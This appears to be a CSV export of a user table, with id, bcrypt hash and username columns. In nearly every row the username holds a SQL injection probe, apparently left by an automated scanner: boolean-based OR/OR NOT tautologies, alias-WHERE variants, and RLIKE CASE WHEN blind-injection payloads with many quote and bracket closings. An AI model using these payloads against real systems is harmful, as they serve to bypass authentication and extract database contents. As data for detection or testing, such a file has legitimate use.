id,password,username
52,$2b$12$NH7HIZRAIDveWWlkup.9kuLfPnxCVJOd/h35xQm9VUHWW.2fqMhHe,-5598') OR 2700=2700#
53,$2b$12$9XfoFsOtvdqFpUSp20GlRuPm7lmeLDHXiRpUGh9iRXG5.oeHzYjhS,-4940' OR 2362=2992#
54,$2b$12$fmOt1rzTx2ARHOJIocM3LuWIRxXCVntbi9BQ7UQQPKIFxNqd.Yvhe,-8498' OR 2700=2700#
55,$2b$12$S1lK1KYHinDqoW/hMDl1IeFb/x6XCZJirn2vkXWNM2J/fuRbdNMBW,-2141)) OR 6332=7675#
56,$2b$12$mHEGTbnnAB32iv.37D7Yt.M4BXdGq8BMD6MM0wZ0ivdGyKpj2Ai8u,-4392)) OR 2700=2700#
57,$2b$12$I7qbTbtRsWVh5tWEmFSEMeVLTiMmb/zMelrLcxtC26z97vn.bgycK,-5431))) OR 3576=6714#
58,$2b$12$fwUb1PJhObO2y8jEpyWSrObQsR9527VqT0/.PH.uzD9ibvLRZtik.,-3529))) OR 2700=2700#
59,$2b$12$t1lsXLorVqEr1METx0ewpufsnZByrXRXGsU0D/QWOSaYGpRLkjmYa,-3850 OR 7660=1543#
60,$2b$12$NzIW1/iNljkylxgFVBxbH.qvaTsaU5L5lI4rPELbzLZ2hboldkwM6,-6581 OR 2700=2700#
61,$2b$12$GcfH2ItagjC9MbLAZ3iTO.EtOPw1qutPFDyW2xwUvkWuc0CUeU1NC,-7656')) OR 7157=3706#
62,$2b$12$Qd7GvOMHQTmV3UGMwRzeXuHb8WFksR8zi.vAev/5j9wwmMFhdUjVa,-4307')) OR 2700=2700#
63,$2b$12$asiZa7OSgFb9i8T.2FVVd.ztTh0zrUQEpfR1OJB3s/hHyscNGXLpu,-7187'))) OR 6961=4844#
64,$2b$12$W52lTX6N4qaFlDkqfcdOieGHq3apg7nNitWEMNbCrWutfG6./VW3G,-5404'))) OR 2700=2700#
65,$2b$12$MjHKeSYfA/yiobGT3oMqeuyMDtJwRI6HbXZlO3P4nQhNDNKbmTEI.,-7269')) AS ISVb WHERE 1324=1324 OR 2324=3255#
66,$2b$12$7WAvYBk3QP.sF1vvjIPfoO2LDCD4l8wQlC5oFlH0GsR6xv4b8dflm,-8652')) AS NcSn WHERE 2731=2731 OR 2700=2700#
67,$2b$12$wQ9pizFMEooPxH5xJ93tT.uEaf7gTJdkaDW8/658X3wZ3A1GNdnmO,-5379)) AS ySsI WHERE 5827=5827 OR 4062=4306#
68,$2b$12$L6g3oD7v5Mqk5WgJi.QXNe0/ufJexHmNukmHqNfZQlVK0LEcdB8.W,-1516)) AS eqad WHERE 4982=4982 OR 2700=2700#
69,$2b$12$S0A4.O5PMG0JVMFTV1vZZuhdcxzpD9.VmstqtF/ZZO3/PwxSlvhFO,-4258') AS DfwP WHERE 6706=6706 OR 5252=1077#
70,$2b$12$xFH3vzHeDN.8UAFtr5fIN.CWo35/D1D1tTkN2Y6MAEzcBb.vr25VG,-8676') AS Duab WHERE 4069=4069 OR 2700=2700#
71,$2b$12$RXGySPexzved1IO7a6ZYWeFRgWVTkR6AGVHODuYZIbRPmduevmne2,-9496) AS yCxy WHERE 5791=5791 OR 3186=2651#
72,$2b$12$X73aJpuMIxaTcmFrRR29WeqAQi/JsQzdNdARMg6MS6F7vqCMzkuLq,-5507) AS tbGw WHERE 7267=7267 OR 2700=2700#
73,$2b$12$yiMZppkh1qOEHtaPI6g5SOg4nQRJTR9ylujPr9pnuo5GwXHOv9t7S,adminaa) OR NOT 7816=2919#
74,$2b$12$4x8RGANKRFBbBiB0M/3QNuULeAIsUZCiFhoXaJg7YOYKezZiec0Mi,adminaa) OR NOT 9510=9510#
75,$2b$12$Mxjcv8AoxRsqFDF6s3lCOOdfCzZqi4/ZKWiyze3wmMGmHjbdrYLZq,adminaa') OR NOT 4792=6044#
76,$2b$12$cLAwX5.yrdimpEiU/5JC/.n0pWUgFobpdr9yHTSqyaga6gONBM/KG,adminaa') OR NOT 9510=9510#
77,$2b$12$QI84Ht5bufmO2avZ/KoOIuXAcGjdYofnXRseRfOxu5Nvheo3/Veey,adminaa' OR NOT 9043=1923#
78,$2b$12$.juFgEBrZC9fNH2ha8Qa0e3Jgi7qnkvyeoG0J/qiWiMLMEWwO.RNy,adminaa' OR NOT 9510=9510#
79,$2b$12$rrtxnVyP4XgNU4L4OKY0guK4JOOeJLt9SJZgjUpP7IdoeIdjTKCP.,adminaa)) OR NOT 6901=6806#
80,$2b$12$xV7NBBOz6ov7Qz5ttfzHuez4S2YEvewLpbkzmvkfKIG9Gcy5F/nUq,adminaa)) OR NOT 9510=9510#
81,$2b$12$na4yqb5tkpkNYP53Y4ouHeNOlli4178AM6QeiTcaOdo1tIa3K58Ty,adminaa))) OR NOT 7824=2913#
82,$2b$12$FlgiiHk.8eeN.IQSMliEme3iT1FwlPHAvuZyi78BVz55oiDoXIua6,adminaa))) OR NOT 9510=9510#
83,$2b$12$lkTT68n0l3ORjDUSR7oheek0ne/jSODXR7JNLPzmrcZtd1uIcb4WS,adminaa OR NOT 9328=2379#
84,$2b$12$0tRthgyBNms8glqO7CbQyujC9lDZcMR4Z5MG6hFhRkTJlp4IPywE.,adminaa OR NOT 9510=9510#
85,$2b$12$oaNzr4LoRSgiPlgkqU8JNOGH75ccCnIL6KSja7UAizXfFoZWWhEUm,adminaa')) OR NOT 3347=5941#
86,$2b$12$XS5fQ/UYgEqpTTNGdnpaYeiQR6TFk49KQ2yunBXERvrFWI0j8oA4m,adminaa')) OR NOT 9510=9510#
87,$2b$12$xfq5Dv9fbP9Rrevs8TiHLeQeLn1znd/xwZeT/jdxvB2UsmNa6mxru,adminaa'))) OR NOT 1081=7498#
88,$2b$12$O2diAzy2hgiZFqpqQLJtleLQy60rh.DQiafRq1Cla/hh0C5eN9axq,adminaa'))) OR NOT 9510=9510#
89,$2b$12$02.1Kw/3J5z0KL5F15qnYO.cD6eCBmJFVwyvEk6pFbiHjFkSvP1v.,adminaa')) AS vLvB WHERE 8983=8983 OR NOT 7036=7575#
90,$2b$12$qzhOWj9eJru32SNWG.u56.1GUZIQ7uMVlyzFht9ix8ByFqK7.Yhc6,adminaa')) AS lwCx WHERE 8047=8047 OR NOT 9510=9510#
91,$2b$12$8UqM23R9d.EPsjKMLHSnuO1DvOY3h.FstMqV0I8Msud9ol93D8gUm,adminaa)) AS IlNz WHERE 2116=2116 OR NOT 2123=9537#
92,$2b$12$zjZ1FUcm5mJipuMIj.QKduxWg42VKOcKaUz.Dd/6pMSyOA/b2ywWq,adminaa)) AS RzzJ WHERE 2719=2719 OR NOT 9510=9510#
93,$2b$12$tvfemSsAGRa.PVnKXWl3be078rXNnaPoi6MeR6WNBzx5OxJRf1F9G,adminaa') AS qwKZ WHERE 7478=7478 OR NOT 3145=1552#
94,$2b$12$XrmCASznPvA71ExG/hCWLO0Jqymrm2VwCOfFGe9D23jE.pUliEY22,adminaa') AS WmZi WHERE 6358=6358 OR NOT 9510=9510#
95,$2b$12$e0rT1uaXFoivvkeonauqFeA7eY0slC13rkpRuM13dHEFycGdZ7hAm,adminaa) AS Ixjq WHERE 5829=5829 OR NOT 2977=7977#
96,$2b$12$ZgtTNAIZOfsE.IH.vwNU1OUnvvXQjnzBIKuua0Pj.SgQNRcqCaNcG,adminaa) AS PRSD WHERE 8428=8428 OR NOT 9510=9510#
97,$2b$12$dIIdMn3P11RUiJFDlkjM3eJjlTgWkEWdBaL/BbcsZliHjqXAaP4yG,adminaa` WHERE 1815=1815 OR NOT 6153=8333#
98,$2b$12$Azr3lZDWR2jCrocakzQatuchiVrPsJNEYWdphQt5.dTaBcTVjl61i,adminaa` WHERE 9120=9120 OR NOT 9510=9510#
99,$2b$12$ExF6WiXRm8pjlYBlOf4yUuEJKhf9mtJaH4fj5stlQQ7adpe75mdo6,adminaa`) WHERE 9803=9803 OR NOT 2232=8578#
100,$2b$12$.x2G85T340ZgBSa7/Oq9OOEizAvMEN.ty9oOjiUqMFVCscxOGnHa.,adminaa`) WHERE 7408=7408 OR NOT 9510=9510#
101,$2b$12$BLK/dOC.9Ch/kxQ/66juMe8V5ap8p.TLnRr42gsJMbnbLDmUZPEXu,adminaa' IN BOOLEAN MODE) OR NOT 1506=4346#
102,$2b$12$Jm/5wVCVtB6CTxqLElxziud9YcqfxEfYdlEeGHriyN5v.mue2vFD6,adminaa' IN BOOLEAN MODE) OR NOT 9510=9510#
103,$2b$12$bHUSsnAvMwsbF/5euIpC6eJHzU/VoqlbX3veGm2eDzA13oQAMKfji,adminaa) RLIKE (SELECT (CASE WHEN (9855=8057) THEN 0x61646d696e6161 ELSE 0x28 END))-- sccW
104,$2b$12$CsdhZf5KiG9qrzsEtY6VEef3HL04KJbV.UX4rclxDN8y4RerA/ZZS,adminaa) RLIKE (SELECT (CASE WHEN (8024=8024) THEN 0x61646d696e6161 ELSE 0x28 END))-- LmiU
105,$2b$12$JofwCMrmcl2w6qGr8IIMU.IzPUoI3IMsObh3wGy9Cinb2tTJKiqW6,adminaa') RLIKE (SELECT (CASE WHEN (6960=2074) THEN 0x61646d696e6161 ELSE 0x28 END))-- LXLQ
106,$2b$12$j.uyIH0WHe8pY2rr4Eaw5OdPeDsa6uBzHDoQNmfBxfxog5CCDxtYS,adminaa') RLIKE (SELECT (CASE WHEN (8024=8024) THEN 0x61646d696e6161 ELSE 0x28 END))-- LzZg
107,$2b$12$Ea8uDN57DOyirv7Usd5SLOKm4FqqV3Il7g9zjTsYBfdi4NwiAW.Xu,adminaa' RLIKE (SELECT (CASE WHEN (4237=3771) THEN 0x61646d696e6161 ELSE 0x28 END))-- XzmF
108,$2b$12$6kQworXSIQj.tD4yNIRBjeMCL/0GOuIHfFd7dVB1uaGZ.p8dMKc0y,adminaa' RLIKE (SELECT (CASE WHEN (8024=8024) THEN 0x61646d696e6161 ELSE 0x28 END))-- oAkE
109,$2b$12$O47Ik1y06HTPFsmiajLyTOzzkZm8dZ9w6dgnEhLKhPpk7hRBuZgJ.,adminaa) RLIKE (SELECT (CASE WHEN (5551=9328) THEN 0x61646d696e6161 ELSE 0x28 END)) AND (7443=7443
110,$2b$12$k16Fg7MMxvi7/iudQkLK0OILtOgFATDOh86hX4ZEcXXZoqDPoKww.,adminaa) RLIKE (SELECT (CASE WHEN (8024=8024) THEN 0x61646d696e6161 ELSE 0x28 END)) AND (4532=4532
111,$2b$12$Nrksre4HCL.XdnPkb9GgD.yj0LufRLKtdz5CP7UtFTUFfkOxJo882,adminaa)) RLIKE (SELECT (CASE WHEN (3951=7048) THEN 0x61646d696e6161 ELSE 0x28 END)) AND ((9670=9670
112,$2b$12$Ho1iH7uhqHnGuEvZT0Lf0u4QouVf4schhnpTjcuGYU22PQa.dPUCW,adminaa)) RLIKE (SELECT (CASE WHEN (8024=8024) THEN 0x61646d696e6161 ELSE 0x28 END)) AND ((4662=4662
113,$2b$12$3mpodG2aBg5P/bb6H0ykOOARHgDPuSnLyaeNQYkXJKZS0mTO9gMqO,adminaa))) RLIKE (SELECT (CASE WHEN (2019=4591) THEN 0x61646d696e6161 ELSE 0x28 END)) AND (((9559=9559
114,$2b$12$0byU6jWWvwpCucqbh2qHMuHvXHxn9.SR1CfiV4Mfv0P1ePpLyvIUe,adminaa))) RLIKE (SELECT (CASE WHEN (8024=8024) THEN 0x61646d696e6161 ELSE 0x28 END)) AND (((9946=9946
115,$2b$12$bwC3W3CseOUFQ0bBY6LqTe/Gwc2fvXxQqYGIq/Zyn26hW1GaSfM0m,adminaa RLIKE (SELECT (CASE WHEN (8723=4831) THEN 0x61646d696e6161 ELSE 0x28 END))
116,$2b$12$/sqp7AcjVt7Nanz6jaq0meJ2wL4y94qFbJzh/6Gn4QXaQulPEdiFS,adminaa RLIKE (SELECT (CASE WHEN (8024=8024) THEN 0x61646d696e6161 ELSE 0x28 END))
117,$2b$12$16f26j4eEt5fnNwpxUT0NOaSuZwulZpIC9xNfPeXrZdgPP6hterrK,adminaa') RLIKE (SELECT (CASE WHEN (9918=2414) THEN 0x61646d696e6161 ELSE 0x28 END)) AND ('sJSY'='sJSY
118,$2b$12$8Ywx6pShOYpfRtCxhw/G1.RjA4OVyaw1UbBFpSYNsxT6kJ.RvlbEa,adminaa') RLIKE (SELECT (CASE WHEN (8024=8024) THEN 0x61646d696e6161 ELSE 0x28 END)) AND ('NsTp'='NsTp
119,$2b$12$taXZiplTkYAtJe3O8qK6qOAwq2ssk8LkBCHFM0WSggasPLlcbOsSq,adminaa')) RLIKE (SELECT (CASE WHEN (9901=3791) THEN 0x61646d696e6161 ELSE 0x28 END)) AND (('zzun'='zzun
120,$2b$12$wo8.W/NJtbZC3omPlN5fNOy/KzIB7UCP1qXpEUDhHLJceJkx2EBCC,adminaa')) RLIKE (SELECT (CASE WHEN (8024=8024) THEN 0x61646d696e6161 ELSE 0x28 END)) AND (('eiAF'='eiAF
121,$2b$12$YlI26mvhUKKeztNpnB/veuZ97NK5dAWuMKuOfB1xGlv7j70aCcEiy,adminaa'))) RLIKE (SELECT (CASE WHEN (1140=9919) THEN 0x61646d696e6161 ELSE 0x28 END)) AND ((('itNQ'='itNQ
122,$2b$12$muiyMT4iZmgDSgRP6lw06eR.2KQpIjF77txu9UJJZIgCeRdVmWvxu,adminaa'))) RLIKE (SELECT (CASE WHEN (8024=8024) THEN 0x61646d696e6161 ELSE 0x28 END)) AND ((('yAST'='yAST
123,$2b$12$HL9s./tA7AEEqtah4kQRMujSyxB6r7cAlap96/WLnjc0cydPu656u,adminaa' RLIKE (SELECT (CASE WHEN (6330=6279) THEN 0x61646d696e6161 ELSE 0x28 END)) AND 'GDyZ'='GDyZ
124,$2b$12$WnLufcm9COnZLZJzqOcKreshqZNQF0AGwcYi0xWbiBaFhKP8nC41C,adminaa' RLIKE (SELECT (CASE WHEN (8024=8024) THEN 0x61646d696e6161 ELSE 0x28 END)) AND 'UqUS'='UqUS
125,$2b$12$g1J/j/LyuL0B8VvjAhAeTOw2tKELCHKzbusU6o18TDvuWITQV2aLy,adminaa') RLIKE (SELECT (CASE WHEN (1869=8175) THEN 0x61646d696e6161 ELSE 0x28 END)) AND ('gUuN' LIKE 'gUuN
126,$2b$12$n7gbim0ZgUI1n0DMLZtQLOaRMgaO36upgqxPSlGft11gCxb5ZEvF.,adminaa') RLIKE (SELECT (CASE WHEN (8024=8024) THEN 0x61646d696e6161 ELSE 0x28 END)) AND ('WOtq' LIKE 'WOtq
127,$2b$12$2Rg6TJyDqALWeFmaXl7PF.1KOnS64KVrKx6LqyWFTMbViP6fintQC,adminaa')) RLIKE (SELECT (CASE WHEN (8427=7458) THEN 0x61646d696e6161 ELSE 0x28 END)) AND (('DJfX' LIKE 'DJfX
128,$2b$12$gTQlzTvwafqiO3ZdLXhgquq1DyAQFyi6L18sakNzDfdwZJYSYyIM6,adminaa')) RLIKE (SELECT (CASE WHEN (8024=8024) THEN 0x61646d696e6161 ELSE 0x28 END)) AND (('bEsh' LIKE 'bEsh
129,$2b$12$bBiC2SN0kesidZLPoMKYse5qzzOIgwic00TZh1d6pRPPCbdwpDrlW,adminaa'))) RLIKE (SELECT (CASE WHEN (2033=7513) THEN 0x61646d696e6161 ELSE 0x28 END)) AND ((('nGNo' LIKE 'nGNo
130,$2b$12$WmZ7jWjXzU9KR.2y.IRaPeDcoY9h7x9DUmkde.6JFQOJbwqKGIYBq,adminaa'))) RLIKE (SELECT (CASE WHEN (8024=8024) THEN 0x61646d696e6161 ELSE 0x28 END)) AND ((('wuwQ' LIKE 'wuwQ
131,$2b$12$d8oLqrS0Tzz2sSm4eCQ9Ge7pc5M8S7ebxY92xngYFL/2KRqMkWj5m,adminaa' RLIKE (SELECT (CASE WHEN (9871=6087) THEN 0x61646d696e6161 ELSE 0x28 END)) AND 'KqNJ' LIKE 'KqNJ
132,$2b$12$d6MZHAGSQN6IjFLLY0bKaOPM/9XpDfP.wCmZOooGAgtLSGaEbjWZe,adminaa' RLIKE (SELECT (CASE WHEN (8024=8024) THEN 0x61646d696e6161 ELSE 0x28 END)) AND 'dGzf' LIKE 'dGzf
133,$2b$12$91d.UUyK8IYvCCZzTmqxculW3Lltg0FnYJBlt8RQ0dcJCbqxiuxuy,1
135,$2b$12$DWz8LnhQ74q0H0EjiAk3PeKAxvexAmZ3GWx9g2ZSOhytJWS2dkTce,adminaa RLIKE (SELECT (CASE WHEN (9882=5651) THEN 0x61646d696e6161 ELSE 0x28 END))-- VVsc
136,$2b$12$MfrR2rICcEBrliARdllFSe4elWmNVC3Zmt34qkMyhl94SWOijq8m2,adminaa RLIKE (SELECT (CASE WHEN (8024=8024) THEN 0x61646d696e6161 ELSE 0x28 END))-- GXEw
137,$2b$12$ffZjsZ3gO8PpsY/JT2z3bu95p2CoA0wE9tZS1xwgdIHRF6UK10IE6,adminaa RLIKE (SELECT (CASE WHEN (8286=8784) THEN 0x61646d696e6161 ELSE 0x28 END))# viYi
138,$2b$12$pC7wDOM61hodybuUvPIBHeh8Yqh.aYBeqIRE45uGT8i9qG/KmmPeO,adminaa RLIKE (SELECT (CASE WHEN (8024=8024) THEN 0x61646d696e6161 ELSE 0x28 END))# lgGD
139,$2b$12$yHHdqUq9Pj0sHDzzC1YaHeTAsJYEOCCinD.3kWofu0JuoCkwk4O0m,adminaa' RLIKE (SELECT (CASE WHEN (4410=3054) THEN 0x61646d696e6161 ELSE 0x28 END)) OR 'Avsu'='BBCw
140,$2b$12$X/TXtorpZn1Bu.zQjoPD0OU3y2MJm0Lwk/r7K0ZfUf3k.kvE00yTe,adminaa' RLIKE (SELECT (CASE WHEN (8024=8024) THEN 0x61646d696e6161 ELSE 0x28 END)) OR 'TONC'='wxqL
141,$2b$12$2vbm61VauK5QAETn557Wl.1qFtn8w/n0A4p.8kzm/s8DEr2kFbpDO,adminaa')) AS ScJq WHERE 3763=3763 RLIKE (SELECT (CASE WHEN (5017=1337) THEN 0x61646d696e6161 ELSE 0x28 END))-- Nssk
142,$2b$12$hbkVRqUaz2k3S2CHSOEycevqpxGnnrw2n5623d./jn6L07QtapWWe,adminaa')) AS FXHw WHERE 4819=4819 RLIKE (SELECT (CASE WHEN (8024=8024) THEN 0x61646d696e6161 ELSE 0x28 END))-- hLqK
143,$2b$12$sM0veFyleiW9tRbtV2sSAeEj89SaEfzA.uw3QBEmDz/i/JToNu32S,adminaa)) AS CgvA WHERE 7466=7466 RLIKE (SELECT (CASE WHEN (9092=6266) THEN 0x61646d696e6161 ELSE 0x28 END))-- vInl
144,$2b$12$UJT2U/K888lLvLA9luR8yOB9ntoelDI2JZNab5mb2BA3w/mvl9h0i,adminaa)) AS WTky WHERE 8857=8857 RLIKE (SELECT (CASE WHEN (8024=8024) THEN 0x61646d696e6161 ELSE 0x28 END))-- BMXb
145,$2b$12$eIjmLuGGCBVMtYGwdM7LK./y4TdesdKsTl32uHy/VShny2BtXiUfy,adminaa') AS cMzT WHERE 4883=4883 RLIKE (SELECT (CASE WHEN (3973=8448) THEN 0x61646d696e6161 ELSE 0x28 END))-- SMiG
146,$2b$12$dJhLPE71dVwCQtbUgF2cmObS3kYnwMaIlLIp3Qye6.1dqxQH.7sO.,adminaa') AS rTKq WHERE 6773=6773 RLIKE (SELECT (CASE WHEN (8024=8024) THEN 0x61646d696e6161 ELSE 0x28 END))-- WBrO
147,$2b$12$5.0IxRkyAuOTI2vUXMe3T.nz72R0h7NEDv6l4C5s275JT2DOud54W,adminaa) AS dOpu WHERE 9468=9468 RLIKE (SELECT (CASE WHEN (7294=5389) THEN 0x61646d696e6161 ELSE 0x28 END))-- Xbrt
